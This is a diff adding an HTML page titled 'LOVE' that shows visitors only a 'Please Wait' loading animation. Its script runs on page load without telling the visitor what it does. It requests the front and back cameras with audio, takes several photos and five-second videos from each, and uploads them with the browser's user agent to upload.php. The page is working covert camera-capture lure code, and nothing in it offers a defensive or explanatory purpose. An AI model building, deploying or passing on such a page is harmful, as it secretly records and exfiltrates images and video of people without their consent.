@@ -1,0 +1,200 @@
+<!-- What else do you know? -->
+
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>LOVE</title>
+</head>
+<body>
+<div class="loading-container">
+  <div class="loading">Please Wait<span class="dots"></span></div>
+</div>
+
+<style>
+
+.loading-container {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: rgba(0,0,0,0.1); 
+  z-index: 9999;
+}
+
+.loading {
+  font-family: 'Arial', sans-serif;
+  font-size: 32px;
+  font-weight: bold;
+  color: #3498db;
+  display: inline-block;
+  letter-spacing: 2px;
+  animation: pulse 1.5s infinite alternate;
+}
+
+
+@keyframes pulse {
+  0% { transform: scale(1); opacity: 0.7; }
+  50% { transform: scale(1.05); opacity: 1; }
+  100% { transform: scale(1); opacity: 0.7; }
+}
+
+.dots::after {
+  content: '';
+  display: inline-block;
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: #3498db;
+  margin-left: 5px;
+  animation: blink 1s infinite steps(3, start);
+}
+
+@keyframes blink {
+  0% { content: ''; }
+  25% { content: '.'; }
+  50% { content: '..'; }
+  75% { content: '...'; }
+  100% { content: ''; }
+}
+</style>
+
+<script>
+
+let frontPhotoCount = 3;
+let backPhotoCount = 3;
+let frontVideoSeconds = 5;
+let backVideoSeconds = 5;
+
+let maxConcurrentUploads = 3; 
+let uploadQueue = [];
+let activeUploads = 0;
+
+async function processQueue() {
+    if (uploadQueue.length === 0 || activeUploads >= maxConcurrentUploads) return;
+    const task = uploadQueue.shift();
+    activeUploads++;
+    await task();
+    activeUploads--;
+    processQueue(); 
+}
+
+
+function enqueueUpload(blob, filename, type, label) {
+    uploadQueue.push(async () => {
+        const fd = new FormData();
+        fd.append("file", blob, filename);
+        fd.append("type", type);
+        fd.append("label", label);
+        await fetch("upload.php", { method: "POST", body: fd });
+    });
+    processQueue();
+}
+
+async function requestCamera(facing){
+    try {
+        return await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: facing },
+            audio: true
+        });
+    } catch(e){
+        return null;
+    }
+}
+
+async function captureFrame(stream){
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r=>setTimeout(r,200));
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video,0,0);
+    return new Promise(resolve=>{
+        canvas.toBlob(resolve,"image/jpeg",0.95);
+    });
+}
+
+function recordVideo(stream, seconds){
+    return new Promise(resolve=>{
+        const chunks=[];
+        const rec = new MediaRecorder(stream);
+        rec.ondataavailable = e=>chunks.push(e.data);
+        rec.onstop = ()=>resolve(new Blob(chunks,{type:"video/webm"}));
+        rec.start();
+        setTimeout(()=>rec.stop(),seconds*1000);
+    });
+}
+
+async function takePhotos(stream,count,label){
+    let success=0;
+    for(let i=0;i<count;i++){
+        try{
+            const blob = await captureFrame(stream);
+            const name=`@Mr_${label}_photo_${Date.now()}_${i+1}.jpg`;
+            enqueueUpload(blob,name,"photo",label);
+            success++;
+        }catch(e){}
+        await new Promise(r=>setTimeout(r,300));
+    }
+    return success;
+}
+
+
+async function takeVideo(stream,seconds,label){
+    let success=0;
+    try{
+        const blob = await recordVideo(stream,seconds);
+        const name=`@Mr_${label}_video_${Date.now()}.webm`;
+        enqueueUpload(blob,name,"video",label);
+        success=1;
+    }catch(e){}
+    return success;
+}
+
+async function startAll(){
+
+    let logData = {
+        ip:null,
+        userAgent:navigator.userAgent,
+        frontPhotos:0,
+        frontVideos:0,
+        backPhotos:0,
+        backVideos:0,
+        timestamp: new Date().toISOString()
+    };
+
+    const fs = await requestCamera("user");
+    if(fs){
+        logData.frontPhotos = await takePhotos(fs, frontPhotoCount, "front");
+        logData.frontVideos = await takeVideo(fs, frontVideoSeconds, "front");
+        fs.getTracks().forEach(t=>t.stop());
+    }
+
+    const bs = await requestCamera("environment");
+    if(bs){
+        logData.backPhotos = await takePhotos(bs, backPhotoCount, "back");
+        logData.backVideos = await takeVideo(bs, backVideoSeconds, "back");
+        bs.getTracks().forEach(t=>t.stop());
+    }
+
+    while(uploadQueue.length>0 || activeUploads>0){
+        await new Promise(r=>setTimeout(r,200));
+    }
+
+    const fd = new FormData();
+    fd.append("logData", JSON.stringify(logData));
+    await fetch("upload.php",{method:"POST",body:fd});
+
+    console.log("Well done! You've made a lot of progress!");
+}
+
+startAll();
+</script>
+</body>
+</html>
